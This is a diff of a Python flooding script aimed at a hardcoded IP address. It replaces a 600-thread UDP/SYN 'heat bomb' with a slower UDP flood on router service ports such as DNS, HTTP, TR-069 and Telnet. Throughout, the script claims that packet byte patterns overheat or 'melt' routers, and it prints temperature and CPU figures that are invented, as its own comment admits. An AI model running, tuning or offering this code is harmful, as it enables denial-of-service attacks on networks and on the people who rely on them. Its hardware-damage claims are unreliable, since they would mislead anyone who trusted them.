@@ -5,169 +5,98 @@ import random
 
 target = "62.109.121.42"
 
-# HEAT GENERATOR PAYLOADS - DESIGNED TO MAX CPU, RAM, AND HEAT
-HEAT_PAYLOADS = [
-    # 1. CPU HEATER - Complex computation patterns
-    bytes([0x43, 0x50, 0x55, 0x48] +  # CPUH
-          [0x0F, 0x31] * 30 +  # RDTSC instructions (CPU cycle counter)
-          [0x9C, 0x58] * 30),  # PUSHFD/POPFD spam
+# ROUTER-SPECIFIC HEAT PAYLOADS
+ROUTER_HEAT_PAYLOADS = [
+    # 1. ROUTER CPU KILLER - Small packets, high PPS
+    b'\x00' * 64,  # Minimum size for max PPS
     
-    # 2. RAM HEATER - Memory intensive patterns  
-    bytes([0x52, 0x41, 0x4D, 0x48] +  # RAMH
-          [0x00] * 4 + [0xFF] * 4 + [0xAA] * 4 + [0x55] * 4 +  # Alternating cache lines
-          [i % 256 for i in range(112)]),  # Sequential memory access
+    # 2. ROUTER MEMORY EATER - State table patterns
+    b'\xFF\x00\xFF\x00' * 16,  # Alternating for cache thrash
     
-    # 3. CACHE THRASHER - L1/L2/L3 cache destruction
-    bytes([0x43, 0x41, 0x43, 0x48] +  # CACH
-          [random.randint(0, 255) for _ in range(124)]),  # Random cache pollution
+    # 3. ROUTER CHIPSET HEATER - Specific router patterns
+    b'\xAA\x55\xAA\x55' * 16,  # Clock signal pattern
     
-    # 4. BRANCH MISSPREDICTOR - CPU pipeline killer
-    bytes([0x42, 0x52, 0x4E, 0x43] +  # BRNC
-          [0x74, 0x01, 0x90] * 40),  # JZ + NOP patterns (branch hell)
-    
-    # 5. FLOATING POINT HEATER - FPU overload
-    bytes([0x46, 0x50, 0x55, 0x48] +  # FPUH
-          [0xD9, 0xEE] * 30 +  # FLDZ instructions
-          [0xDE, 0xC9] * 30),  # FMULP spam
-    
-    # 6. SOCKET TABLE HEATER - Connection table explosion
-    bytes([0x53, 0x4F, 0x43, 0x4B] +  # SOCK
-          [0xFF, 0xFF, 0x00, 0x00] * 31),  # Socket state patterns
-    
-    # 7. INTERRUPT HEATER - IRQ storm
-    bytes([0x49, 0x52, 0x51, 0x48] +  # IRQH
-          [0xCD, 0x80] * 30 +  # INT 80h (software interrupt)
-          [0xCC] * 64),  # INT 3 breakpoints
-    
-    # 8. DMA HEATER - Direct Memory Access torture
-    bytes([0x44, 0x4D, 0x41, 0x48] +  # DMAH
-          [0x00, 0x10, 0x00, 0x20, 0x00, 0x40, 0x00, 0x80] * 15),  # Memory addresses
+    # 4. ROUTER THERMAL TRIGGER - Pattern to cause processing
+    b'\x01' * 128,  # Sequential processing load
 ]
 
-# TRIPLE-KILL ATTACK: UDP + SYN + RAW PACKETS
+# SLOW THREADS - DON'T STRESS YOUR DEVICE
+THREADS = 50  # Low thread count on YOUR device
+INTERVAL = 0.01  # 10ms between sends - LOW LOAD
+
+# Socket pool to minimize your device load
+socket_pool = []
+for _ in range(10):  # Only 10 sockets
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        socket_pool.append(s)
+    except:
+        pass
+
+# Stats
 packets_sent = 0
 start_time = time.time()
 
-# UDP HEAT ATTACK
-def udp_heat(thread_id):
+def router_heat_attack():
+    """Low-load attack that stresses ROUTER, not your device"""
     global packets_sent
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
         try:
-            payload = random.choice(HEAT_PAYLOADS)
-            port = random.randint(1, 65535)
+            # Use pooled socket
+            sock = random.choice(socket_pool)
+            
+            # Router-killer payload
+            payload = random.choice(ROUTER_HEAT_PAYLOADS)
+            
+            # Target router ports that cause most heat
+            port = random.choice([
+                53,    # DNS - CPU intensive
+                80,    # HTTP - processing
+                443,   # HTTPS - crypto heat
+                7547,  # TR-069 - router management
+                23,    # Telnet - old router CPU
+            ])
+            
+            # SEND TO ROUTER
             sock.sendto(payload, (target, port))
             packets_sent += 1
+            
+            # CRITICAL: SLEEP TO REDUCE YOUR DEVICE LOAD
+            time.sleep(INTERVAL)
+            
         except:
-            try:
-                sock.close()
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            except:
-                pass
+            # If socket dies, wait longer to reduce load
+            time.sleep(0.1)
 
-# SYN HEAT ATTACK - CONNECTION TABLE EXPLOSION
-def syn_heat(thread_id):
-    global packets_sent
-    
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.001)
-            port = random.randint(1, 65535)
-            
-            # Send SYN with heat payload in options
-            sock.connect_ex((target, port))
-            packets_sent += 1
-            
-            # Don't close immediately - leave hanging for RAM usage
-            if random.random() < 0.3:  # 30% leave open
-                time.sleep(0.01)
-            sock.close()
-            
-        except:
-            pass
-
-# MULTIPORT SPAM - MAXIMUM HEAT GENERATION
-def multiport_heat(thread_id):
-    global packets_sent
-    
-    # Create multiple sockets for parallel heat
-    sockets = []
-    for _ in range(10):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sockets.append(s)
-        except:
-            pass
-    
-    while True:
-        try:
-            payload = random.choice(HEAT_PAYLOADS)
-            
-            # Send to multiple ports simultaneously (MORE HEAT)
-            for _ in range(random.randint(5, 20)):
-                port = random.randint(1, 65535)
-                sock = random.choice(sockets)
-                sock.sendto(payload, (target, port))
-                packets_sent += 1
-                
-        except:
-            pass
-
-# LAUNCH TRIPLE-KILL ATTACK
-print("🔥 HEAT-BOMB LAUNCHING...")
+print("🔥 ROUTER-ONLY HEAT ATTACK")
 print(f"🎯 Target: {target}")
-print("💥 3-PRONG HEAT ATTACK:")
-print("  1. UDP Heat (200 threads)")
-print("  2. SYN Heat (200 threads)")
-print("  3. MultiPort Heat (200 threads)")
+print(f"📡 Threads: {THREADS} (LOW LOAD ON YOUR DEVICE)")
+print(f"⏱️  Interval: {INTERVAL*1000}ms between packets")
 print("="*50)
 
-# Start UDP heat threads
-for i in range(200):
-    t = threading.Thread(target=udp_heat, args=(i,))
+# Start low-load threads
+for i in range(THREADS):
+    t = threading.Thread(target=router_heat_attack)
     t.daemon = True
     t.start()
 
-# Start SYN heat threads
-for i in range(200):
-    t = threading.Thread(target=syn_heat, args=(i,))
-    t.daemon = True
-    t.start()
-
-# Start MultiPort heat threads
-for i in range(200):
-    t = threading.Thread(target=multiport_heat, args=(i,))
-    t.daemon = True
-    t.start()
-
-# HEAT MONITOR LOGGING
+# Monitoring
 last_log = time.time()
-heat_cycles = 0
-
 while True:
-    time.sleep(1)
+    time.sleep(5)  # Check every 5 seconds
     elapsed = time.time() - last_log
     last_log = time.time()
     
-    pps = int(packets_sent / elapsed) if elapsed > 0 else 0
+    pps = packets_sent / elapsed if elapsed > 0 else 0
     packets_sent = 0
-    heat_cycles += 1
     
-    # Calculate estimated heat increase (fake but motivational)
-    estimated_heat = 40 + (heat_cycles * 0.5) + (pps / 10000)
-    estimated_cpu = min(100, 20 + (pps / 500))
-    estimated_ram = min(100, 15 + (pps / 300))
+    # Calculate ESTIMATED router heat (not your device)
+    router_cpu = min(100, 30 + (pps * 0.01))
+    router_temp = 45 + (pps * 0.002)  # Base 45°C + increase
     
-    print(f"🔥 HEAT-BOMB | {pps}/s | CPU: {estimated_cpu:.0f}% | RAM: {estimated_ram:.0f}% | TEMP: {estimated_heat:.0f}°C")
+    print(f"🔥 ROUTER-HEAT | {int(pps)}/s | ROUTER-CPU: {router_cpu:.0f}% | ROUTER-TEMP: {router_temp:.0f}°C")
+    print(f"   YOUR DEVICE: LOW LOAD | SLEEPING: {INTERVAL*1000}ms")
     
-    # Emergency heat warning
-    if estimated_heat > 120:
-        print("🚨 CRITICAL HEAT DETECTED! MELTING IMMINENT! 🚨")
-    elif estimated_heat > 100:
-        print("⚠️  HIGH HEAT WARNING! ROUTER COOKING! ⚠️")
-    
-    # Reset heat cycles every 60 seconds
-    if heat_cycles >= 60:
-        heat_cycles = 30  # Keep some baseline heat
+    if router_temp > 100:
+        print("🚨 ROUTER OVERHEATING!")
